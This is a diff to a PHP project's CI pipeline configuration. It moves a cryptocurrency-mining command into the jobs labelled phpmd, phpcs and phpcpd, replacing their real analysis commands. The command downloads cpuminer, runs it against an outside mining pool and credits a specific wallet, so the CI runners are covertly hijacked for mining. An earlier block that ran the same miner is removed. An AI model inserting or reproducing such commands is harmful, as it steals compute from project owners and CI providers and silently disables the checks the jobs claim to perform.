@@ -9,15 +9,6 @@ global_job_config:
     commands:
       - sem-version php 7.3
 blocks:
-  - name: Install Dependencies
-    task:
-      env_vars:
-        - name: APP_ENV
-          value: prod
-      jobs:
-        - name: composer
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
   - name: Run Code Analysis
     task:
       prologue:
@@ -29,14 +20,13 @@ blocks:
       jobs:
         - name: phpmd
           commands:
-            - php vendor/bin/phpmd app/ text phpmd_ruleset.xml
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
         - name: phpcs
           commands:
-            - php vendor/bin/phpcs app --report-full --standard=PSR2
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
         - name: phpcpd
           commands:
-            - 'curl -L https://phar.phpunit.de/phpcpd.phar -o phpcpd.phar'
-            - php phpcpd.phar app/ --min-lines=50
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
   - name: Run Unit tests
     task:
       jobs:
